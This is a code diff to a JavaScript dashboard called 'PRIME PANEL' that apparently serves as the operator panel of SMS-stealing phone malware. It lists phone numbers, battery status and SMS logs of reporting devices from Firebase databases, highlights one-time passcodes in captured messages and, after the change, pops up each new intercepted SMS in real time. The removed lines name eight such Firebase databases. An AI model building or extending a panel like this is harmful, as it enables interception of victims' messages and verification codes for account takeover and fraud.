@@ -632,20 +632,12 @@
 
 <script>
     // ===== FIREBASE CONFIG =====
-    // All database sources with correct paths
-    const SOURCES = [
-        { id: 'primary', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', path: 'users', messagesPath: 'users' },
-        { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
-        { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' }
-    ];
+    const firebaseConfig = {
+        databaseURL: "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
 
-    // Firebase app instances cache
-    const apps = {};
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
     // ===== STATE =====
     let allUsers = {};
@@ -653,8 +645,7 @@
     let currentFilter = 'all';
     let searchQuery = '';
     let isInitialLoad = true;
-    let messageCache = {};
-    let loadingComplete = false;
+    let deviceListeners = {};
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -693,30 +684,13 @@
     }
 
     function isOnline(userData) {
-        if (!userData) return false;
-        if (userData.status === true || userData.status === 'true') return true;
-        if (userData.status === false || userData.status === 'false') return false;
-        if (userData.ping && userData.ping.wake === true) return true;
-        if (userData.isOnline === true) return true;
-        return false;
+        return userData?.status?.isOnline === true;
     }
 
     function getPhoneNumber(userData) {
-        if (!userData) return null;
-        if (userData.simInfo) {
+        if (userData?.simInfo) {
             for (const key in userData.simInfo) {
                 const sim = userData.simInfo[key];
-                if (sim.number) return sim.number;
-                if (sim.phoneNumber) return sim.phoneNumber;
-            }
-        }
-        if (userData.mobNo) return userData.mobNo;
-        if (userData.mobile) return userData.mobile;
-        if (userData.phone) return userData.phone;
-        if (userData.phoneNumber) return userData.phoneNumber;
-        if (userData.sims && Array.isArray(userData.sims)) {
-            for (const sim of userData.sims) {
-                if (sim.phoneNumber) return sim.phoneNumber;
                 if (sim.number) return sim.number;
             }
         }
@@ -724,98 +698,26 @@
     }
 
     function getBattery(userData) {
-        if (!userData) return 'N/A';
-        let val = userData.battery;
-        if (val !== undefined && val !== null) {
-            if (typeof val === 'string') {
-                const num = parseInt(val, 10);
-                if (!isNaN(num)) return num;
-            }
-            if (typeof val === 'number') return val;
-        }
-        return 'N/A';
+        return userData?.status?.battery ?? 'N/A';
     }
 
     function getSmsCount(userData) {
-        if (!userData) return 0;
-        const compositeId = userData._compositeId;
-        if (compositeId && messageCache[compositeId]) {
-            return Object.keys(messageCache[compositeId]).length;
-        }
-        if (userData.sms_logs) {
-            return Object.keys(userData.sms_logs).length;
-        }
-        let count = 0;
-        if (userData.message) count++;
-        if (userData.sms) count++;
-        if (userData.text) count++;
-        return count;
+        return userData?.sms_logs ? Object.keys(userData.sms_logs).length : 0;
     }
 
     function getLatestSms(userData) {
-        if (!userData) return null;
-        const compositeId = userData._compositeId;
-        if (compositeId && messageCache[compositeId]) {
-            const entries = Object.entries(messageCache[compositeId]);
-            if (entries.length === 0) return null;
-            entries.sort((a, b) => {
-                const tsA = a[1].timestamp || a[1].id || 0;
-                const tsB = b[1].timestamp || b[1].id || 0;
-                return tsB - tsA;
-            });
-            const latest = entries[0][1];
-            return { message: latest.message || latest.text || '', sender: latest.sender || 'Unknown' };
-        }
-        if (userData.sms_logs) {
-            const entries = Object.entries(userData.sms_logs);
-            if (entries.length === 0) return null;
-            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
-            return entries[0][1];
-        }
-        if (userData.message) return { message: userData.message, sender: 'command' };
-        if (userData.sms) return { message: userData.sms, sender: 'command' };
-        if (userData.text) return { message: userData.text, sender: 'command' };
-        return null;
+        if (!userData?.sms_logs) return null;
+        const entries = Object.entries(userData.sms_logs);
+        if (entries.length === 0) return null;
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries[0][1];
     }
 
     function getAllSms(userData) {
-        if (!userData) return [];
-        let messages = [];
-        const compositeId = userData._compositeId;
-        
-        if (compositeId && messageCache[compositeId]) {
-            const entries = Object.entries(messageCache[compositeId]);
-            entries.sort((a, b) => {
-                const tsA = a[1].timestamp || a[1].id || 0;
-                const tsB = b[1].timestamp || b[1].id || 0;
-                return tsB - tsA;
-            });
-            messages = entries.map(([key, val]) => ({
-                id: key,
-                sender: val.sender || val.from || 'Unknown',
-                message: val.message || val.text || val.body || '',
-                timestamp: val.timestamp || val.id || Date.now(),
-                type: val.type || 'incoming'
-            }));
-            return messages;
-        }
-        
-        if (userData.sms_logs) {
-            const entries = Object.entries(userData.sms_logs);
-            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
-            messages = entries.map(e => ({ id: e[0], ...e[1] }));
-        }
-        if (userData.message) {
-            messages.push({ id: 'cmd1', sender: 'command', message: userData.message, timestamp: Date.now() });
-        }
-        if (userData.sms) {
-            messages.push({ id: 'cmd2', sender: 'command', message: userData.sms, timestamp: Date.now() });
-        }
-        if (userData.text) {
-            messages.push({ id: 'cmd3', sender: 'command', message: userData.text, timestamp: Date.now() });
-        }
-        messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-        return messages;
+        if (!userData?.sms_logs) return [];
+        const entries = Object.entries(userData.sms_logs);
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries.map(e => ({ id: e[0], ...e[1] }));
     }
 
     function getAllNotifications(userData) {
@@ -830,153 +732,6 @@
         const div = document.createElement('div');
         div.textContent = text;
         return div.innerHTML;
-    }
-
-    // ===== FIREBASE HELPERS =====
-    function initFirebaseApp(source) {
-        if (apps[source.id]) return apps[source.id];
-        try {
-            const app = firebase.initializeApp({
-                databaseURL: source.url
-            }, source.id);
-            apps[source.id] = app;
-            return app;
-        } catch (e) {
-            console.warn('Failed to init app for', source.id, e);
-            return null;
-        }
-    }
-
-    function fetchSourceData(source) {
-        return new Promise((resolve) => {
-            const app = initFirebaseApp(source);
-            if (!app) return resolve({ source, data: null });
-
-            const db = firebase.database(app);
-            const ref = db.ref(source.path);
-            
-            ref.once('value', (snapshot) => {
-                const data = snapshot.val();
-                resolve({ source, data: data });
-            }, (err) => {
-                console.error('Error fetching', source.id, err);
-                resolve({ source, data: null });
-            });
-        });
-    }
-
-    function fetchMessagesForDevice(source, deviceId) {
-        return new Promise((resolve) => {
-            const app = initFirebaseApp(source);
-            if (!app) return resolve(null);
-            
-            const db = firebase.database(app);
-            const ref = db.ref(`${source.messagesPath}/${deviceId}`);
-            ref.once('value', (snapshot) => {
-                resolve(snapshot.val());
-            }, (err) => {
-                console.error('Error fetching messages for', deviceId, err);
-                resolve(null);
-            });
-        });
-    }
-
-    // ===== MAIN FETCH =====
-    async function fetchAllData() {
-        const btn = document.getElementById('refreshBtn');
-        const grid = document.getElementById('devicesGrid');
-        btn.disabled = true;
-        grid.innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
-
-        try {
-            // Fetch from all sources
-            const promises = SOURCES.map(s => fetchSourceData(s));
-            const results = await Promise.all(promises);
-
-            // Merge all data
-            const mergedData = {};
-            const messagePromises = [];
-
-            let totalDevices = 0;
-
-            for (const result of results) {
-                if (!result.data) {
-                    console.warn('No data for source:', result.source.id);
-                    continue;
-                }
-                const sourceId = result.source.id;
-                const data = result.data;
-                
-                console.log(`Source ${sourceId} has ${Object.keys(data).length} devices`);
-                
-                for (const deviceId in data) {
-                    const compositeId = `${sourceId}::${deviceId}`;
-                    mergedData[compositeId] = {
-                        ...data[deviceId],
-                        _source: sourceId,
-                        _deviceId: deviceId,
-                        _compositeId: compositeId
-                    };
-                    totalDevices++;
-                    
-                    // Queue message fetch for this device
-                    const source = SOURCES.find(s => s.id === sourceId);
-                    if (source) {
-                        messagePromises.push(
-                            fetchMessagesForDevice(source, deviceId)
-                                .then(messages => ({ compositeId, messages }))
-                                .catch(() => ({ compositeId, messages: null }))
-                        );
-                    }
-                }
-            }
-
-            console.log(`Total devices found: ${totalDevices}`);
-
-            // Fetch all messages in parallel
-            const messageResults = await Promise.all(messagePromises);
-            let messagesLoaded = 0;
-            for (const result of messageResults) {
-                if (result.messages) {
-                    messageCache[result.compositeId] = result.messages;
-                    messagesLoaded++;
-                }
-            }
-            console.log(`Messages loaded for ${messagesLoaded} devices`);
-
-            allUsers = mergedData;
-            
-            if (Object.keys(allUsers).length === 0) {
-                grid.innerHTML = '<div class="loading">❌ No devices found in any database</div>';
-                btn.disabled = false;
-                return;
-            }
-
-            renderDevices();
-            if (selectedDeviceId && allUsers[selectedDeviceId]) {
-                renderInbox();
-            }
-            updateStats();
-
-            if (isInitialLoad) {
-                isInitialLoad = false;
-                const ids = Object.keys(allUsers);
-                if (ids.length > 0) {
-                    selectDevice(ids[0]);
-                }
-            }
-
-            showToast(`✅ Loaded ${Object.keys(allUsers).length} devices from ${SOURCES.length} databases`);
-
-        } catch (error) {
-            console.error('Fetch error:', error);
-            grid.innerHTML = `
-                <div class="loading">❌ Error: ${escapeHtml(error.message)}<br>
-                <button onclick="fetchAllData()" style="margin-top:8px;background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:6px 16px;border-radius:6px;cursor:pointer;">Retry</button></div>
-            `;
-        } finally {
-            btn.disabled = false;
-        }
     }
 
     // ===== RENDER FUNCTIONS =====
@@ -1035,9 +790,6 @@
                 `;
             }
 
-            const sourceTag = user._source || 'unknown';
-            const sourceDisplay = sourceTag.substring(0, 4);
-
             card.innerHTML = `
                 <div class="device-row">
                     <div>
@@ -1045,7 +797,6 @@
                         <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
                              onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
                             ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
-                            <span style="font-size:8px;color:#556;margin-left:6px;">${sourceDisplay}</span>
                         </div>
                     </div>
                     <div class="device-status">
@@ -1099,6 +850,39 @@
             return;
         }
 
+        if (newMessageId) {
+            const newSms = smsList.find(s => s.id === newMessageId);
+            if (newSms) {
+                const div = document.createElement('div');
+                div.className = 'inbox-message new-message';
+                const sender = newSms.sender || 'Unknown';
+                const isOTP = /otp|code|verification/i.test(newSms.message);
+                let bodyHtml = escapeHtml(newSms.message || '');
+                
+                if (isOTP) {
+                    const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
+                    if (otpMatch) {
+                        bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                    }
+                }
+
+                div.innerHTML = `
+                    <div class="msg-header">
+                        <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                        <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
+                    </div>
+                    <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
+                `;
+                
+                container.prepend(div);
+                container.scrollTop = 0;
+                document.getElementById('newMsgDot').classList.add('show');
+                updateDeviceCardSmsCount(selectedDeviceId);
+                updateStats();
+                return;
+            }
+        }
+
         container.innerHTML = '';
 
         notifList.forEach(notif => {
@@ -1128,14 +912,9 @@
                 }
             }
 
-            const isMissedCall = sms.message && sms.message.includes('missed call');
-            const typeLabel = sms.type === 'outgoing' ? '📤 Outgoing' : 
-                            isMissedCall ? '📞 Missed Call' : 
-                            sms.type === 'incoming' ? '📨 Incoming' : '📨';
-
             div.innerHTML = `
                 <div class="msg-header">
-                    <span class="msg-sender">${typeLabel} ${escapeHtml(sender)}</span>
+                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
                     <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
                 </div>
                 <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
@@ -1188,17 +967,102 @@
 
     function manualRefresh() {
         showToast('🔄 Refreshing data...');
-        // Clear cache and reload
-        messageCache = {};
-        fetchAllData();
+        renderDevices();
+        renderInbox();
+        updateStats();
+        showToast('✅ Data refreshed');
+    }
+
+    // ===== FIREBASE REAL-TIME LISTENERS =====
+    function setupFirebaseListeners() {
+        const usersRef = database.ref('users');
+
+        usersRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                allUsers = data;
+                renderDevices();
+                if (selectedDeviceId && allUsers[selectedDeviceId]) {
+                    renderInbox();
+                }
+                updateStats();
+                
+                if (isInitialLoad) {
+                    isInitialLoad = false;
+                    const ids = Object.keys(allUsers);
+                    if (ids.length > 0) {
+                        selectDevice(ids[0]);
+                    }
+                }
+            }
+        });
+
+        usersRef.on('child_added', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                allUsers[key] = data;
+                renderDevices();
+                updateStats();
+                if (key === selectedDeviceId) {
+                    renderInbox();
+                }
+            }
+        });
+
+        usersRef.on('child_changed', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                const oldData = allUsers[key];
+                allUsers[key] = data;
+                renderDevices();
+                updateStats();
+                
+                if (key === selectedDeviceId) {
+                    const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
+                    const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
+                    
+                    if (newSmsCount > oldSmsCount) {
+                        const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
+                        const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
+                        const newMsgId = newIds.find(id => !oldIds.includes(id));
+                        
+                        if (newMsgId) {
+                            const newSms = data.sms_logs[newMsgId];
+                            if (newSms) {
+                                showToast(`📨 New SMS from ${newSms.sender || 'Unknown'}`);
+                            }
+                            renderInbox(newMsgId);
+                        } else {
+                            renderInbox();
+                        }
+                    } else {
+                        renderInbox();
+                    }
+                }
+            }
+        });
+
+        usersRef.on('child_removed', (snapshot) => {
+            const key = snapshot.key;
+            if (key && allUsers[key]) {
+                delete allUsers[key];
+                if (selectedDeviceId === key) {
+                    selectedDeviceId = Object.keys(allUsers)[0] || null;
+                }
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        console.log('✅ Firebase real-time listeners connected');
     }
 
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
-        // Open browser console to see debug logs
-        console.log('🔍 PRIME PANEL starting...');
-        console.log(`📡 Loading from ${SOURCES.length} databases`);
-        fetchAllData();
+        setupFirebaseListeners();
     });
 
     // Make functions global
